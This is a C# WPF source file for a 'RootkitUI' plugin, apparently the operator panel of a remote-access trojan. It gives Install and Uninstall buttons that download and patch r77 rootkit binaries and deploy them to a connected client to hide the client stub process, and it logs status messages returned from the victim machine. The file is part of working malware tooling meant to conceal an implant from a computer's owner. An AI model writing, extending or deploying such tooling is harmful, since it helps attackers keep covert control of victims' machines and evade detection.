using System;
using System.Runtime.Versioning;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class RootkitUI : UserControl, IDisposable
    {
        private static Color C(string key) => (Color)Application.Current.Resources[key];
        private static SolidColorBrush B(string key) => (SolidColorBrush)Application.Current.Resources[key];

        private readonly PluginContext _context;
        private readonly PluginHost _host;
        private readonly RootkitPlugin _plugin;

        Color BgCol => C("BackgroundColor");
        Color SurfCol => C("SurfaceColor");
        Color BrdCol => C("BorderColor");
        Color TxtCol => C("TextPrimaryColor");
        Color DimCol => C("TextSecondaryColor");
        Color DanCol => C("DangerColor");
        Color DanHov => C("DangerHoverColor");
        Color OkCol => C("SuccessColor");
        Color OkHov => C("SuccessHoverColor");
        Color AccCol => C("PrimaryColor");
        Color AccHov => C("PrimaryHoverColor");

        SolidColorBrush BgB => B("BackgroundBrush");
        SolidColorBrush SfB => B("SurfaceBrush");
        SolidColorBrush TxB => B("TextPrimaryBrush");
        SolidColorBrush DmB => B("TextSecondaryBrush");
        SolidColorBrush BdB => B("BorderBrush");

        private readonly TextBox _logBox;
        private readonly Button _installBtn;
        private readonly Button _uninstallBtn;
        private readonly ProgressBar _progress;
        private readonly TextBlock _statusText;

        private bool _disposed;
        private bool _busy;

        public RootkitUI(PluginContext ctx, PluginHost host, RootkitPlugin plugin)
        {
            _context = ctx;
            _host = host;
            _plugin = plugin;

            string prefix = plugin.PrefixInfo;

            var root = new Grid();
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            var hdr = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Padding = new Thickness(8) };
            hdr.Child = new TextBlock { Text = prefix + " Rootkit \u2014 Fileless Process Hiding", FontSize = 14, FontWeight = FontWeights.SemiBold, Foreground = TxB };
            Grid.SetRow(hdr, 0);
            root.Children.Add(hdr);

            var infoBar = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Padding = new Thickness(8) };
            infoBar.Child = new TextBlock
            {
                Text = "Auto-detects and hides the client stub process. Install to activate " + prefix + " rootkit.",
                Foreground = DmB, FontSize = 12, TextWrapping = TextWrapping.Wrap
            };
            Grid.SetRow(infoBar, 1);
            root.Children.Add(infoBar);

            var bb = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Padding = new Thickness(8, 6, 8, 6) };
            var bp = new StackPanel { Orientation = Orientation.Horizontal };
            _installBtn = MakeBtn("Install & Configure", OkCol, OkHov, Brushes.White);
            _installBtn.Click += async (s, e) => await Install();
            _uninstallBtn = MakeBtn("Uninstall", DanCol, DanHov, Brushes.White);
            _uninstallBtn.Click += async (s, e) => await Uninstall();
            _statusText = new TextBlock { Text = "Ready", Foreground = DmB, FontSize = 12, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(8, 0, 0, 0) };
            bp.Children.Add(_installBtn);
            bp.Children.Add(_uninstallBtn);
            bp.Children.Add(_statusText);
            bb.Child = bp;
            Grid.SetRow(bb, 2);
            root.Children.Add(bb);

            _progress = new ProgressBar { Height = 4, Minimum = 0, Maximum = 100, Value = 0, Visibility = Visibility.Collapsed, Foreground = B("PrimaryBrush") };
            Grid.SetRow(_progress, 3);
            root.Children.Add(_progress);

            var lb = new Border { Background = BgB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 0) };
            _logBox = new TextBox
            {
                Background = BgB, Foreground = new SolidColorBrush(Color.FromRgb(100, 220, 100)),
                BorderThickness = new Thickness(0), FontFamily = new FontFamily("Consolas"),
                FontSize = 11, IsReadOnly = true, TextWrapping = TextWrapping.Wrap,
                VerticalScrollBarVisibility = ScrollBarVisibility.Auto, Padding = new Thickness(4),
                CaretBrush = Brushes.Transparent, AcceptsReturn = true, Style = null
            };
            lb.Child = _logBox;
            Grid.SetRow(lb, 4);
            root.Children.Add(lb);

            Content = root;
            Background = BgB;
        }

        Button MakeBtn(string text, Color bg, Color hv, SolidColorBrush fg)
        {
            var nb = new SolidColorBrush(bg); var hb = new SolidColorBrush(hv);
            var bb = new SolidColorBrush(C("ButtonBorderColor")); var db = new SolidColorBrush(C("ButtonBgColor"));
            var tp = new ControlTemplate(typeof(Button));
            var bd = new FrameworkElementFactory(typeof(Border), "bd");
            bd.SetValue(Border.BackgroundProperty, nb); bd.SetValue(Border.BorderBrushProperty, bb);
            bd.SetValue(Border.BorderThicknessProperty, new Thickness(1)); bd.SetValue(Border.CornerRadiusProperty, new CornerRadius(3));
            bd.SetValue(Border.PaddingProperty, new Thickness(8, 4, 8, 4)); bd.SetValue(Border.SnapsToDevicePixelsProperty, true);
            var cp = new FrameworkElementFactory(typeof(ContentPresenter), "cp");
            cp.SetValue(ContentPresenter.HorizontalAlignmentProperty, HorizontalAlignment.Center);
            cp.SetValue(ContentPresenter.VerticalAlignmentProperty, VerticalAlignment.Center);
            bd.AppendChild(cp); tp.VisualTree = bd;
            var h = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true }; h.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); tp.Triggers.Add(h);
            var p = new Trigger { Property = ButtonBase.IsPressedProperty, Value = true }; p.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); p.Setters.Add(new Setter(UIElement.OpacityProperty, 0.85, "bd")); tp.Triggers.Add(p);
            var d = new Trigger { Property = UIElement.IsEnabledProperty, Value = false }; d.Setters.Add(new Setter(Border.BackgroundProperty, db, "bd")); d.Setters.Add(new Setter(ContentPresenter.OpacityProperty, 0.4, "cp")); tp.Triggers.Add(d);
            return new Button { Content = text, Template = tp, Foreground = fg, Cursor = Cursors.Hand, Margin = new Thickness(2), FontSize = 12, FontWeight = FontWeights.SemiBold };
        }

        async Task Install()
        {
            if (_busy) return;
            _busy = true;
            _installBtn.IsEnabled = false;
            _statusText.Text = "Installing...";
            _progress.Visibility = Visibility.Visible;
            _progress.Value = 0;

            try
            {
                Log("Downloading and patching rootkit binaries...");
                _progress.Value = 10;
                bool ok = await _plugin.EnsureR77Downloaded();
                if (!ok)
                {
                    Log("Failed to acquire rootkit binaries.");
                    _statusText.Text = "Failed";
                    return;
                }
                Log("Patched binaries ready (" + _plugin.PrefixInfo + " prefix)");
                _progress.Value = 30;

                Log("Deploying rootkit to hide client stub (auto-detected)...");
                Log("Deploying to client...");
                _progress.Value = 50;

                bool deployed = await _plugin.DeployAndInstallForClient(_context.ClientId, "self");
                if (deployed)
                {
                    Log("Installation in progress... Check client logs for status.");
                    _statusText.Text = "Sent";
                    _progress.Value = 100;
                }
                else
                {
                    Log("Deployment failed");
                    _statusText.Text = "Failed";
                }
            }
            catch (Exception ex)
            {
                Log("Error: " + ex.Message);
                _statusText.Text = "Error";
            }
            finally
            {
                _busy = false;
                _installBtn.IsEnabled = true;
                await Task.Delay(1500);
                _progress.Visibility = Visibility.Collapsed;
            }
        }

        async Task Uninstall()
        {
            if (_busy) return;
            _busy = true;
            _uninstallBtn.IsEnabled = false;
            _statusText.Text = "Uninstalling...";
            _progress.Visibility = Visibility.Visible;
            _progress.Value = 20;

            try
            {
                Log("Deploying Uninstall.exe...");
                _progress.Value = 50;
                await _plugin.UninstallForClient(_context.ClientId);
                Log("Uninstall in progress...");
                _statusText.Text = "Sent";
                _progress.Value = 100;
            }
            catch (Exception ex)
            {
                Log("Error: " + ex.Message);
                _statusText.Text = "Error";
            }
            finally
            {
                _busy = false;
                _uninstallBtn.IsEnabled = true;
                await Task.Delay(1500);
                _progress.Visibility = Visibility.Collapsed;
            }
        }

        public void HandleServerData(byte[] data)
        {
            if (_disposed || data == null || data.Length == 0) return;
            Dispatcher.BeginInvoke(() =>
            {
                if (_disposed) return;
                try
                {
                    switch (data[0])
                    {
                        case 0xFD: if (data.Length > 1) Log("[C] " + Encoding.UTF8.GetString(data, 1, data.Length - 1)); break;
                        case 0xFE: if (data.Length > 2)
                            {
                                string text = Encoding.UTF8.GetString(data, 2, data.Length - 2);
                                Log("[OK] " + text);
                                if (text.Contains("Install complete") || text.Contains("Configured"))
                                    _statusText.Text = "Installed";
                                else if (text.Contains("Uninstall complete"))
                                    _statusText.Text = "Uninstalled";
                            }
                            break;
                        case 0xFF: if (data.Length > 1) Log("[ERR] " + Encoding.UTF8.GetString(data, 1, data.Length - 1)); break;
                    }
                }
                catch { }
            });
        }

        void Log(string msg)
        {
            if (_disposed) return;
            if (!Dispatcher.CheckAccess()) { Dispatcher.BeginInvoke(() => LogI(msg)); return; }
            LogI(msg);
        }

        void LogI(string msg)
        {
            if (_disposed) return;
            string line = "[" + DateTime.Now.ToString("HH:mm:ss") + "] " + msg + "\n";
            _logBox.AppendText(line);
            _logBox.ScrollToEnd();
        }

        public void Dispose() { _disposed = true; }
    }
}
